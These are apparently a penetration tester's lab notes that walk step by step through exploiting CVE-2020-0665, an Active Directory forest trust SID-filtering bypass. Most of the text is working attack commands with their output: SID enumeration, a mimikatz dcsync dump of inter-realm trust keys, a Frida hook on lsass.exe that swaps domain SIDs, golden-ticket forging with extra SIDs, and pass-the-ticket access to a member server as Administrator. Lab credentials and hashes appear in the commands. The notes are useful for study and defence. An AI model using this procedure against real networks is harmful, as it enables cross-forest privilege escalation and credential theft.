## What is?
This vulnerability leverages the intended feature of a `Transitive Trust`, allowing an attacker to compromise any host or workstation within a trusted forest that has a Two-way Transitive Trust relationship established with the Trusting forest.
Specifically, it allows **bypassing** of the `SID filtering` mechanism and compromise of hosts in a trusted forest.
## Good to know
<font color="#ff0000">This flaw was patched in the `February 2020` update and was given `CVE-2020-0665`.</font>

## What are Transitive Trust?
A transitive trust refers to a trust relationship in Active Directory that *extends beyond two domains* to include additional domains in the forest. In essence, it enables authentication and resource access across multiple domains within the same forest.
In a transitive trust scenario, such as between `Forest A` and `Forest B`, the trust relationship extends beyond the direct connection between the two forests. In this setup, `Forest B` not only trusts `Forest A` but also extends its trust to all domains within `Forest A`. This includes subdomains, sub-subdomains, and any other domain trees within `Forest A`.

## How to enumerate?
We can use this tool https://github.com/dirkjanm/forest-trust-tools to enumerate the `TrustForestTrustInfo` attribute that holds the information about the structure of the domain trust.
```shell-session
python3 ftinfo.py 

FOREST_TRUST_INFO
Version: {1}
Recordcount: {3}
Records: {[<__main__.FOREST_TRUST_INFO_RECORD object at 0x7f081266fca0>, <__main__.FOREST_TRUST_INFO_RECORD object at 0x7f0812613760>, <__main__.FOREST_TRUST_INFO_RECORD object at 0x7f0812624e50>]}
Domain b'child.inlanefreight.ad' has SID S-1-5-21-3878752286-62540090-653003637
Domain b'child.inlanefreight.ad' has SID b'\x01\x04\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\x1e\x101\xe7:I\xba\x03u\x0b\xec&'
Domain b'inlanefreight.ad' has SID S-1-5-21-2432454459-173448545-3375717855
Domain b'inlanefreight.ad' has SID b'\x01\x04\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00;O\xfc\x90a\x9dV\n\xdf]5\xc9'
```
(From here can we understand that `logistics` domain contains the `SIDs` for both `inlanefreight.ad` and `child.inlanefreight.ad`.)

# Attack
## How it work?
we possess full control over all operations within `Forest A`, we have the capability to manipulate the trust relationships established within that forest. By adding arbitrary `Security Identifiers (SIDs)` to the list of domains within `Forest A`, we effectively influence the trust relationships between domains within the forest. As a result, any new domains added to `Forest A` will be trusted by other forests, such as `Forest B`, after the default trust propagation period, which typically occurs over a span of `24 hours`.
Suppose we have compromised and have full control over the `inlanefreight.ad` domain, we can change and add an arbitrary `SID` to the `child.inlanefreight.ad`, which would eventually be propagated to `logistics.ad`
## Requirements
This vulnerability represents an elevation of privilege flaw in Active Directory Forest trusts. It arises from a default configuration that permits an attacker residing in the `trusting` forest to request delegation of a Ticket Granting Ticket (TGT) for an identity originating from the `trusted` forest. This vulnerability is commonly recognized as the `Active Directory Elevation of Privilege Vulnerability`.

In order to be able to pull out this trick you will need:
1. DC01 and DC02 must have a Two-way Transitive Trust
2. DC01 must have a Child Domain (subdomain)
3. DC02 has at least one domain joined member server or workstation
4. Remember the patch should not be installed(**before 02/2020**)
## Steps involved
![](attachment/34bbdcf6e54ac2d4186351d517d3740e.png)
1. Control over the Child domain (`child.inlanefreight.ad`) that extends its trust to the `Logistics` domain by default. (Because of a Two-way Transitive Trust between domains)
2. Enumerate the `local SID` of a workstation (`SQL02`) in the `Logistics` domain using credentials of the `Inlanefreight` domain.
3. Modify the `SID` of the `Child Domain` present in the `Inlanefreight` domain to match with the `local SID` of a member server (`SQL02`) in `Logistics` domain.
4. The New `SID` for child domain (`child.inlanefreight.ad`) propagates back to the `Logistics` domain allowing us to generate a Golden Ticket for SQL02 with RID 500.
5. Use the generated ticket to log into SQL02 in `logistics.ad` domain as the `Administrator` user for that host.
## Attack Phase
We start by obtaining the SID of the target server(**SQL02.logistics.ad**) over *logistics.ad* we want to take over with this [toolset](https://github.com/dirkjanm/forest-trust-tools/).
```shell-session
python getlocalsid.py inlanefreight.ad/Administrator@SQL02.logistics.ad SQL02
Found local domain SID: S-1-5-21-2327345182-1863223493-3435513819
```
Retrieve the DomainSID of the domain we control(*child.inlanefreight.ad*).
```shell-session
impacket-lookupsid inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.20 | grep "Domain SID"
[*] Domain SID is: S-1-5-21-3878752286-62540090-653003637
```
Retrieve the DomainSID of the target parent domain(we still have control) in this case(*inlanefreight.ad*).
```shell-session
impacket-lookupsid inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.3 | grep "Domain SID"
[*] Domain SID is: S-1-5-21-2432454459-173448545-3375717855
```
Now obtain the GUID of the Domain objects.
```powershell-session
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid
name                   objectguid
----                   ----------
logistics.ad           8d52f9da-361b-4dc3-8fa7-af5f282fa741
child.inlanefreight.ad 44591edf-66d2-4d8c-8125-facb7fb3c643
```
And we can perform a **InterRealm** ticket request to the domain you want to takeover.
```powershell-session
mimikatz(commandline) # lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}
[DC] 'inlanefreight.ad' will be the domain
[DC] 'DC01.inlanefreight.ad' will be the DC server
[DC] Object with GUID '{8d52f9da-361b-4dc3-8fa7-af5f282fa741}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Object RDN           : logistics.ad
** TRUSTED DOMAIN - Antisocial **
Partner              : logistics.ad
[  In ] INLANEFREIGHT.AD -> LOGISTICS.AD
* 3/9/2024 2:59:14 AM - CLEAR   - c3 e5 50 e1 5d 93 50 97 ef a7 fd 9d 8a 98 57 79 fc e6 c4 29 d2 d1 32 ec 84 e9 7d 82 ac 96 5e 04 94 e9 c3 bc 38 b3 8e 75 c1 bc 53 b9 c4 9e 28 82 52 7e f3 06 84 73 80 e9 1f b6 80 83 6d 1c 98 85 10 85 34 80 6b e8 d4 66 6c 68 37 7f 87 55 d4 b1 ab a5 b1 ad 2c 9c 95 03 a9 8a 86 2d 66 22 b0 5b 4b ac b8 80 d0 d9 ca b5 b7 8d 2d 59 3c 50 b3 41 88 7d 7a ef fb 3d 33 aa 51 04 f3 17 1b 55 ce c1 d2 0a 70 48 e0 73 d4 59 6e a1 af d5 1e bd 78 14 7d 5a 03 52 05 f1 c5 51 48 f5 e4 d8 cf f0 d7 91 24 9f 50 f4 c0 08 ed a2 e7 dd 83 60 4e 2d 9c be 1b 5b cd 90 44 4d 86 3c 4f 60 16 19 b5 54 9f 44 ca 5e 51 bf a8 7d 84 3c 24 f8 f2 ff 1d 38 55 44 22 ac 60 eb 88 46 42 55 1f 7a 2a 1d 98 d1 47 f1 74 c9 6a b6 8f 3e a7 58 4b d1 b7 cb 9b 30 46 e1

* aes256_hmac       179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8
* aes128_hmac       f1091ce43342170b7c29eb9a54a413e4
* rc4_hmac_nt       c586031a224f252a7c8a31a6d2210cc1
```
At this point, we have gathered the following data points:
- LocalSID of victim server (SQL02.logistics.ad) - `S-1-5-21-2327345182-1863223493-3435513819`
- Child Domain SID for `child.inlanefreight.ad` - `S-1-5-21-3878752286-62540090-653003637`
- Domain SID for `inlanefreight.ad` - `S-1-5-21-2432454459-173448545-3375717855`
- Inter-realm tickets with RC4 hash (For Logistics.ad) - `c586031a224f252a7c8a31a6d2210cc1`
- Inter-realm tickets with AES keys (For Logistics.ad) - `179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8`
*Now if where the fund begins...* As we must inject the SID of(**SQL02.logistics.ad**) into the child domain we control(**child.inlanefreight.ad**) and wait for propagation before being able to pullout a Golden ticket for the machine takeover.
We must hook the lsass.exe in order to edit the trust chain and we can use the frida script to do so. https://github.com/dirkjanm/forest-trust-tools/blob/master/frida_intercept.py
But before we need to convert the SID to binary conversion with this script:
```python
input_string = 'S-1-5-21-2327345182-1863223493-3435513819'
prefix = 'S-1-5-21-'

# Split the input string after the constant prefix
components = input_string.split(prefix, 1)
if len(components) > 1:
    remaining_string = components[1]
    split_values = remaining_string.split('-')
    output_list = []
    for i in split_values:
        decimal_number = int(i)
        hexadecimal_value = hex(decimal_number)[2:].zfill(8)
        little = ' '.join([hexadecimal_value[i:i+2] for i in range(len(hexadecimal_value)-2, -2, -2)])
        bytes_list = little.split()
        formatted_bytes = ', '.join([f"0x{byte.upper()}" for byte in bytes_list]) 
        output_list.append(formatted_bytes)
    final_output = ', '.join(output_list)
    print("0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, " + final_output)
```
Allowing us to get the SID from DEC2BIN.

|SID|Binary Representation of SID|
|---|---|
|S-1-5-21-3878752286-62540090-653003637|0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x10, 0x31, 0xE7, 0x3A, 0x49, 0xBA, 0x03, 0x75, 0x0B, 0xEC, 0x26|
|S-1-5-21-2327345182-1863223493-3435513819|0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x78, 0xB8, 0x8A, 0xC5, 0x88, 0x0E, 0x6F, 0xDB, 0xC7, 0xC5, 0xCC|
And we can update the frida script to match the new values to be injected into lsass.exe on the Child domain(**buf1=childSID newsid=SQL02sid**)
```frida_intercept
<SNIP>
// Sid as binary array to find/replace
var buf1 = [0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x10, 0x31, 0xE7, 0x3A, 0x49, 0xBA, 0x03, 0x75, 0x0B, 0xEC, 0x26];
var newsid = [0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x78, 0xB8, 0x8A, 0xC5, 0x88, 0x0E, 0x6F, 0xDB, 0xC7, 0xC5, 0xCC];
<SNIP>
```
Now invoke a shell as *NTSystem* on the **child domain**(this is important otherwise the injection will fail!). Just leave in going in background.
```powershell-session
.\PsExec.exe -s -i powershell.exe
```
Now can we see that the forest trust has been changed to match the one to SQL02.
```shell-session
 python gettrustinfo.py inlanefreight.ad/logistics.ad@DC01 -hashes :c586031a224f252a7c8a31a6d2210cc1 -target 172.16.118.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

<SNIP>
                DomainInfo:                     
                    Sid:                            
                        Revision:                        1 
                        SubAuthorityCount:               4 
                        IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05' 
                        SubAuthority:                   
                            [
                                 21,
                                 2327345182,
                                 1863223493,
                                 3435513819,
                            ] 
                    DnsName:                         'child.inlanefreight.ad' 
                    NetbiosName:                     'CHILD' ,
```
<font color="#ff0000">OBS: In real life, after 24 hours when `logistics` domain performs the Netlogon call `NetrGetForestTrustInformation` on `inlanefreight` domain it'll receive the new SID that is being intercepted by `frida_intercept.py`.</font>
When this netlogon call has been made we can ask a Golden ticket by using *extrasids* for Administrator@logistics.ad(remember to add **-500** to the **-sids** option).
```powershell-session
mimikatz # kerberos::golden /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /user:user1 /target:logistics.ad /service:krbtgt /sids:S-1-5-21-2327345182-1863223493-3435513819-500 /aes256:179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8
```
And finally perform a request to TGS in order to get a valid service ticket to access the final victim aka SQL02.
```powershell-session
kekeo # tgs::ask /tgt:ticket.kirbi /service:cifs/SQL02.logistics.ad@LOGISTICS.AD /kdc:DC02.logistics.ad /ptt
Ticket  : ticket.kirbi
```
And you can see the ticket from the session.
```powershell-session
C:\Tools>klist
Current LogonId is 0:0xdd8a8

Cached Tickets: (1)

#0>     Client: user1 @ inlanefreight.ad
		Server: cifs/SQL02.logistics.ad @ LOGISTICS.AD
		KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
		Start Time: 3/27/2024 3:16:14 (local)
		End Time:   3/27/2024 13:16:14 (local)
		Renew Time: 4/3/2024 3:16:14 (local)
		Session Key Type: AES-256-CTS-HMAC-SHA1-96
		Cache Flags: 0
		Kdc Called:
```